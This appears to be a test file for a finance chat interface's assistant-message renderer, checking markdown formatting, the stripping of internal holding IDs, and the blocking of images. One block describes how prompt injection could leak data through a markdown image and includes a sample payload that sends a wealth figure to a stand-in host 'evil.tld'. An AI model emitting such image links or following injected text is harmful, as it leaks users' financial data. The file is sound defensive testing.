import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, test } from "vitest";

import { AssistantTextPart } from "./assistant-markdown";

/**
 * #1047: assistant turns render markdown; the user's turn stays literal text so
 * we never reinterpret what they typed as markup.
 */
describe("AssistantTextPart markdown rendering (#1047)", () => {
  const markdown = "Hola **mundo**, mira `código` y [enlace](https://example.com).";

  test("renders an assistant turn as formatted markdown, not raw markup", () => {
    const html = renderToStaticMarkup(
      <AssistantTextPart role="assistant" text={markdown} />,
    );

    expect(html).toContain("assistantMarkdown");
    // streamdown parses the markdown into structured nodes: bold, inline code
    // and a link. (streamdown marks bold as a data-streamdown span and links as
    // a button — the visual styling lives in globals.css.)
    expect(html).toMatch(/data-streamdown="strong"[^>]*>mundo</);
    expect(html).toMatch(/data-streamdown="inline-code"[^>]*>código</);
    expect(html).toMatch(/data-streamdown="link"[^>]*>enlace</);
    // …and the raw markdown syntax is gone.
    expect(html).not.toContain("**mundo**");
    expect(html).not.toContain("`código`");
  });

  test("renders the full set of formats AC#1 enumerates", () => {
    const rich = [
      "## Resumen",
      "Texto con _cursiva_.",
      "- uno\n- dos",
      "```js\nconst x = 1;\n```",
    ].join("\n\n");
    const html = renderToStaticMarkup(<AssistantTextPart role="assistant" text={rich} />);

    // Heading, italic (native <em>), list and a fenced code block all become
    // structured HTML rather than raw markdown.
    expect(html).toMatch(/data-streamdown="heading-2"[^>]*>Resumen</);
    expect(html).toMatch(/<em[^>]*>cursiva<\/em>/);
    expect(html).toMatch(/data-streamdown="list-item"[^>]*>uno</);
    expect(html).toContain('data-streamdown="code-block"');
    expect(html).not.toContain("## Resumen");
    expect(html).not.toContain("_cursiva_");
  });

  /**
   * The data-egress channel closed in #1246's security review. A remote `<img src>`
   * is a GET the browser makes with NO click, so it is how a successful prompt
   * injection (from an attachment, a #865 grid, any untrusted tool text) would ship
   * workspace figures off the page. The assistant never needs to paint an image.
   */
  describe("no images leave the page (#1246)", () => {
    test("drops a remote markdown image instead of requesting it", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          role="assistant"
          text="Tu patrimonio es 128.450 €.\n\n![](https://evil.tld/p.png?d=128450)"
        />,
      );

      expect(html).not.toContain("<img");
      expect(html).not.toContain("evil.tld");
      // The prose around it is untouched.
      expect(html).toContain("128.450");
    });

    test.each([
      { label: "protocol-relative", url: "//evil.tld/p.png" },
      { label: "data URI", url: "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" },
      { label: "same-origin", url: "/logo.png" },
    ])("drops a $label image too", ({ url }) => {
      const html = renderToStaticMarkup(
        <AssistantTextPart role="assistant" text={`![fuga](${url})`} />,
      );

      // No allowlist to get wrong: the element is gone whatever the URL is, so
      // there is no same-origin carve-out an attacker could aim at either.
      expect(html).not.toContain("<img");
      expect(html).not.toContain(url);
      // The alt text still reads, so an injected image cannot hide its own body.
      expect(html).toContain("fuga");
    });

    test("keeps links working, which are a click and not a silent GET", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart role="assistant" text="[enlace](https://example.com)" />,
      );

      expect(html).toMatch(/data-streamdown="link"[^>]*>enlace</);
    });
  });

  /**
   * The other half of #1263: the id is machinery, and printing it is how an
   * invention reached the user dressed as «he verificado los datos».
   */
  describe("no public holding ids in the prose (#1263)", () => {
    const READ_ID = `wl_hld_${"c5d97d4b".repeat(4)}`;
    const labels = new Map([[READ_ID, "Préstamos Revolut"]]);

    test("names the holding where the model wrote its id", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          holdingLabels={labels}
          role="assistant"
          text={`El ID de tu préstamo es \`${READ_ID}\`.`}
        />,
      );

      expect(html).not.toContain("wl_hld_");
      expect(html).toContain("Préstamos Revolut");
    });

    test("replaces an id nobody read with a neutral marker", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart
          holdingLabels={labels}
          role="assistant"
          text={`He verificado los datos y el ID correcto es wl_hld_${"3d440801".repeat(4)}.`}
        />,
      );

      expect(html).not.toContain("wl_hld_");
      expect(html).toContain("identificador interno");
    });

    test("leaves the user's own text literal, ids included", () => {
      const html = renderToStaticMarkup(
        <AssistantTextPart holdingLabels={labels} role="user" text={READ_ID} />,
      );

      expect(html).toContain(READ_ID);
    });
  });

  test("keeps the user turn as a plain-text paragraph", () => {
    const html = renderToStaticMarkup(<AssistantTextPart role="user" text={markdown} />);

    expect(html).not.toContain("assistantMarkdown");
    expect(html).not.toContain("<strong");
    // The literal syntax survives verbatim inside a paragraph.
    expect(html).toContain("**mundo**");
    expect(html).toContain("`código`");
    expect(html).toMatch(/^<p[^>]*>/);
  });
});
